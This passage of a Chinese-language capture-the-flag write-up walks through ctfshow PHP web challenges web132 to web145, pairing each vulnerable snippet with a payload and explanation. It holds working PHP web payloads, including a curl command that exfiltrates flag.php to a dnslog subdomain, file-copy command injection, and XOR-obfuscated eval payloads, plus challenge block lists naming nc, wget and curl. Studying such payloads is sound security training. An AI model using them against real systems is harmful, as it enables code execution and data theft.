class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?username=admin&amp;password[]=1&amp;code=admin</code></p><ul><li><p><code>mt_rand</code>：生成更好的随机数</p></li><li><p>按照要求来构造参数</p><ul><li>username=admin</li><li>code=admin</li><li>password用数组绕过</li></ul></li></ul><h1 id="web133-无回显rce，dnslog外带"><a href="#web133-无回显rce，dnslog外带" class="headerlink" title="web133(无回显rce，dnslog外带)"></a>web133(无回显rce，dnslog外带)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?F=`$F `;curl `cat flag.php`.k4t3vw.dnslog.cn</code></p><ul><li><code>substr($F,0,6)</code>：从0位置开始截取6个长度。</li><li>`<code>和</code>shell_exec`等价</li><li>解题思路：</li></ul><blockquote><p>因为参数只能为六个字符，所以命令执行函数只有``了</p><p>又因为需要传命令，但是六个字符肯定不够用，所以考虑变量覆盖，用$F替换F，从而达到超出六个字符执行命令的结果</p><p>因为没有回显，所以只能将结果用别的方法输出出来，这里用的是Dnslog外带数据</p><p>将F覆盖后，利用curl将命令与dnslog的二级域名一起带出来，在解析的过程中，会将``里面的数据当作命令执行，从而达到将数据带出。</p></blockquote><h1 id="web134-parse-str-amp-extract"><a href="#web134-parse-str-amp-extract" class="headerlink" title="web134(parse_str&amp;extract)"></a>web134(parse_str&amp;extract)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><ul><li><code>parse_str()</code>：把查询字符解析到变量</li><li><code>ectract()</code>：从数组中将变量导入当前的符号表</li><li>php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。</li></ul><h1 id="web135-linux命令"><a href="#web135-linux命令" class="headerlink" title="web135(linux命令)"></a>web135(linux命令)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?F=`$F `;cp flag.php 1.txt  访问1.txt</code></p><ul><li>过滤了cat，curl等命令，所以我们用Dnslog外带获取数据很困难</li><li>不妨将flag.php拷贝到别的文件，在访问别的文件获得flag</li></ul><h1 id="web136-linux命令，tee"><a href="#web136-linux命令，tee" class="headerlink" title="web136(linux命令，tee)"></a>web136(linux命令，tee)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?c=ls /|tee 1 ?c=cat /f149_15_h3r3|tee 2 访问2下载文件，查看</code></p><ul><li>tee命令：用于读取标准输入的数据，并将其内容输出成文件<ul><li><code>tee file1 file2</code>：复制文件</li><li><code>ls /|tee 1.txt</code>：命令输出</li></ul></li></ul><h1 id="web137-调用函数"><a href="#web137-调用函数" class="headerlink" title="web137(::调用函数)"></a>web137(::调用函数)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure><p><code>payload: ctfshow=ctfshow::getFlag</code></p><ul><li>函数的调用<ul><li><code>::</code>：调用类中的函数</li></ul></li></ul><h1 id="web138-call-user-func传数组"><a href="#web138-call-user-func传数组" class="headerlink" title="web138(call_user_func传数组)"></a>web138(call_user_func传数组)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure><p><code>payload: ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code></p><ul><li><p><code>call_user_func</code>回调函数调用类里面的方法</p></li><li><p><code>call_user_func(array($classname, &#39;say_hello&#39;));</code><br>将调用$calssname类里面的<code>say_hello</code>的方法</p></li></ul><h1 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h1><ul><li>咦？怎么不能下载文件了？</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload:</code></p><h1 id="web140-intval-弱比较"><a href="#web140-intval-弱比较" class="headerlink" title="web140(intval()弱比较)"></a>web140(intval()弱比较)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: f1=md5&amp;f2=md5</code></p><ul><li>想要输出flag，只需让<code>intval($code)</code>为零即可</li><li>例：</li></ul><blockquote><p>md5(phpinfo())<br>md5(sleep())<br>md5(md5())<br>current(localeconv)<br>sha1(getcwd())<br>sha1(sha1())</p></blockquote><h1 id="web141-异或"><a href="#web141-异或" class="headerlink" title="web141(异或)"></a>web141(异或)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=2&amp;v3=-(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da)-</code></p><ul><li>传的三个参数中，<code>v1</code>和<code>v2</code>必须为数字，<code>v3</code>中不能有数字、字母、下划线</li></ul><blockquote><p>测试一下</p><p>假设我们要执行的代码为<code>phpinfo();</code>，其中<code>;</code>已经提供了，<code>v1</code>和<code>v2</code>需要为数字，所以只能在<code>v3</code>处传参。</p><p>经过本地测试发现：<br>当代码为<code>phpinfo();</code>时，可以正常执行代码<br>因为<code>()</code>不符合<code>v3</code>的限定条件，所以<code>v3</code>中可以有<code>()</code></p><p>当代码为<code>1+phpinfo()+1;</code>时，也可以执行代码<br>所以<code>v1</code>和<code>v2</code>值就可以确定为任意数字，并且通过<code>+</code>或<code>-</code>连接</p><p>当代码为<code>2+(&#39;phpinfo&#39;)()+2;</code>时，发现也可以正常执行<br>此时就可以确定<code>v3</code>参数分为三部分组成，前面一部分是<code>+</code>，中间为<code>()</code>里面是想要执行的代码，后面的一部分为<code>()+</code></p><p>在中间的一部分中，因为不能有数字、字母或者下划线，所以可以采用异或的方法构造恶意代码使其执行。</p></blockquote><ul><li>解题思路：</li></ul><blockquote><p>通过上面的测试发现可以正常执行代码，所以我们只需要根据自己想要的代码进行异构即可</p></blockquote><h1 id="web142-sleep"><a href="#web142-sleep" class="headerlink" title="web142(sleep)"></a>web142(sleep)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v1=0</code></p><ul><li>仔细发现阻碍我们的只有<code>sleep</code>函数，所以只需让<code>$d</code>数值尽可能地小就行</li><li>所以我们让传进去的<code>v1</code>值为0即可</li></ul><h1 id="web143-异或，"><a href="#web143-异或，" class="headerlink" title="web143(异或，*)"></a>web143(异或，*)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=2&amp;v3=*(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da)*</code></p><ul><li>过滤了一大堆东西，但是<code>*</code>并没有被过滤掉，所以只需将141的<code>payload</code>的<code>-</code>换成<code>*</code>即可</li></ul><h1 id="web144-异或"><a href="#web144-异或" class="headerlink" title="web144(异或)"></a>web144(异或)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v3=2&amp;v2=*(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da)</code></p><ul><li>改一下141<code>paylod</code>格式即可</li></ul><h1 id="web145-或，取反"><a href="#web145-或，取反" class="headerlink" title="web145(或，取反)"></a>web145(或，取反)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span 